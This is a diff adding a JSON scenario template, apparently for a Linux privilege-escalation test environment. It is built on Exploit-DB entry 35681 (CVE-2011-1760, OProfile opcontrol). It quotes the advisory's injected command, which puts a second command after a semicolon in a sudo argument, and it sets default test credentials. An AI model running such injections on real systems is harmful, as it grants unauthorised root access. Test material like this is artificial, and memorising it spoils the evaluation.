@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_35681",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: OProfile 0.9.6 - 'opcontrol' Utility 'set_event()' Local Privilege Escalation (CVE-2011-1760;OSVDB-72792)\n\nExploit source code (35681.txt):\n```\nsource: https://www.securityfocus.com/bid/47652/info\n\nOProfile is prone to a local privilege-escalation vulnerability.\n\nAn attacker can exploit this issue to run arbitrary commands with superuser privileges.\n\nThe following example command is available:\n\nsudo opcontrol -e \"abcd;/usr/bin/id\"\n```",
+  "cve": "CVE-2011-1760;OSVDB-72792",
+  "exploitdb_id": "35681",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_35681",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
